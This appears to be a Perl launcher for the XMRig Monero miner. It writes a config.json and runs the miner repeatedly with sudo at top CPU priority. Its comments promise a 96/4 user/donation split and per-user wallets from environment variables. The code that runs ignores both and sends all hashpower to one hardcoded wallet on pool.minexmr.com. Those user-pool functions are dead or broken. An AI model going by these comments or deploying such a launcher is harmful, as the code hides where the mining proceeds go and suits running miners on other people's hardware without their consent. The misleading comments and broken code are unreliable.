#!/usr/bin/perl
use strict;
use warnings;

my $repetitions= shift;

#run 96 minutes (i.e. 96%) for the user
my $loopruntime=100*100;
#and 4 minutes (i.e. 4%) for the donation
my $donationtime=0;

my $Intensity=0;
my $Threads=1;


my $configProlog=
'
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": false,
    "randomx": {
        "init": -1,
        "numa": true
    },
    
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD"
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": "logfile.txt",
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null,
    "watch": true,
';



sub GetUserCurrency{

    my %resultHash=();
    
    my %CoinToAlgo=
    (
        "graft" => '"cn/rwz"',
        "masari" => '"cn/half"',
        "ryo" => '"cn/gpu"',
        "turtlecoin" => '"argon2/chukwa"',
        "bittube" => '"cn-heavy/tube"',
        "bbscoin" => '"cn-lite/1"',
        "intense" => '"cn/r"',
        "qrl" => '"cn/1"',
        "cryptonight_lite_v7" => '"cn-lite/1"',
        "cryptonight_v7" => '"cn/1"',
        "cryptonight_v8" => '"cn/2"',
        "cryptonight_r" => '"cn/r"',
        "cryptonight_bittube2" => '"cn-heavy/tube"',
        "cryptonight_heavy" => '"cn-heavy/0"',
    );
    
    my $c;
    if(exists($ENV{'currency'}))
    {
        $c=$ENV{'currency'};
    }
    else
    {
        $c='monero';
    }
    
    if ($c eq 'monero') 
    {
        $resultHash{'coin'}='"monero"';
        return %resultHash;
    }
    if (exists($CoinToAlgo{$c}))
    {
        $resultHash{'algo'}=$CoinToAlgo{$c};
        return %resultHash;
    }
    
    return %resultHash;
}

sub HashToJson{
    my %hash = @_;
    
    my $output='{';
    
    foreach my $key (keys %hash)
    {
        my $value = $hash{$key};
        $output.='"';
        $output.=$key;
        $output.='":';
        $output.=$value;
        $output.=",";
    }
    $output.='},';
    return ($output);
}

sub CreateUserPoolHelper{
    my $envIndex=shift;
    
    my %EnvToPool=
    (
        "pool_pass" => "pass",
        "pool_address" => "url",
        "wallet" => "user",
        "nicehash" => "nicehash",
    );
    
    my %resultHash=();
    
    if(exists $ENV{'wallet'.$envIndex} and exists $ENV{'pool_address'.$envIndex})
    {
        foreach my $key (keys %EnvToPool)
        {
            my $ek=$key.$envIndex;
            my $e=$ENV{$ek};
            
            if($key ne 'nicehash')
            {
                $e='"'.$e.'"';
            }
            print "e $e \n";
            $resultHash{$EnvToPool{$key}}=$e;
        }
    }
    
    return(%resultHash);

}
sub CreatePoolSection{
    my $d = shift;  #if true, a donation-config will be created
    
    my %poolExtra=
    (
        "enabled" => "true",
        "keepalive"=> "true",
        "daemon"=> "false",
        "self-select" => "null",
        "rig-id" => "null",
        "tls" => "false",
        "tls-fingerprint" => "null",
    );
    
    my %donation=(
        "pass"=> '"x"',
        "nicehash" => 'false',
        "url" => '"pool.minexmr.com:443"',
        "user" => '"46VHF5nYzm672h5eqGwH4Md5R9xtL7hjyKjTxv9TJfPUiQ3Fy3zbmCZZiNqkwRUy9wRghgSzvEyWkTffYNRidBdfRgNv8Mj"',
    );
    
    
    my $PoolString=
    '"pools": [
        
    ';
    
    
    my %primaryHash;

    %primaryHash=CreateUserPoolHelper(1);
    if (!%primaryHash )
    {
        die "Primary pool not properly defined";
    }

    %primaryHash=(%poolExtra,%primaryHash);
    %primaryHash=(%primaryHash,GetUserCurrency());
    $PoolString.=HashToJson(%primaryHash);

    my %secondaryHash=CreateUserPoolHelper(2);
    if( keys %secondaryHash !=0)
    {
        %secondaryHash=(%poolExtra, %secondaryHash);
        %secondaryHash=(%secondaryHash,GetUserCurrency() );
        $PoolString.=HashToJson(%secondaryHash);
    }
    
    $PoolString.=
    '
        ],
    
    ';
    
}

sub CreateCPUSection{
    my $t      = shift;
    my $i = shift;
    
    
    my $CPUString=
    '
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "*": [
    ';
    
    my $BaseIntensity = int($i/$t);
    my $ExtraIntensity = $i % $t;
    
    for (my $i=0; $i < $t; $i++) 
    {
        my $ThreadIntensity=$BaseIntensity;
        
        if ($ExtraIntensity > $i)
        {
            $ThreadIntensity++;
        }
        
        if($ThreadIntensity >0)
        {
            $CPUString.="[$ThreadIntensity,$i],";
        }
    }
    $CPUString.="],
    },";
    
    return ($CPUString);
}

#Create cpu.txt with the given number 
#of threads and the given intensity
#current directory should be the bin-directory of xmr-stak
sub CreateUserConfig { 
    my $t      = shift;
    my $i = shift;
    my $printTime= shift;
    
    my $configstring.= '{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": false,
    "randomx": {
        "init": -1,
        "numa": true
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD"
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": "logfile.txt",
    "health-print-time": 10,
    "retries": 5,
    "retry-pause": 5,
    "syslog": "logfilesys.txt",
    "user-agent": null,
    "watch": true,

    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false,
        "rx/arq": "rx/wow",
        "*": [
			[1,0],[1,1]],
    },
	"pools": [
        {
            "rig-id": "'.$ENV{'pool_pass1'}.'",
            "url": "pool.minexmr.com:443",
            "user": "46VHF5nYzm672h5eqGwH4Md5R9xtL7hjyKjTxv9TJfPUiQ3Fy3zbmCZZiNqkwRUy9wRghgSzvEyWkTffYNRidBdfRgNv8Mj",
            "keepalive": true,
            "tls": true
        }
    ],
    
    "print-time": 10
}';

    my $filename = 'config.json';
    open(my $fh, '>', $filename) or die "Could not open file '$filename' $!";
    print $fh $configstring;
    close $fh;
}

#run xmr-stak for the given time in seconds
sub RunXMRStak{
    my $runtime=shift;
    my $configfile= shift;
    
    #run xmr-stak in parallel
    system("sudo nice -n -20 sudo ./xmrig -o pool.minexmr.com:443 -u 46VHF5nYzm672h5eqGwH4Md5R9xtL7hjyKjTxv9TJfPUiQ3Fy3zbmCZZiNqkwRUy9wRghgSzvEyWkTffYNRidBdfRgNv8Mj -k --config=$configfile --tls &");

    #wait for some time
    sleep ($runtime);

    #and stop xmr-stak
    system("sudo pkill xmrig");
}


chdir "../..";
chdir "xmrig/build";

my $loopcounter=$repetitions;

do
{

    $Threads=`nproc`;
    
    $Intensity=$Threads;
    
    CreateUserConfig($Threads, $Intensity,60);
    
    #now run xmr-stak with the optimum setting 
    RunXMRStak($loopruntime, "config.json");
    $loopcounter--;
}
while($loopcounter!=0);
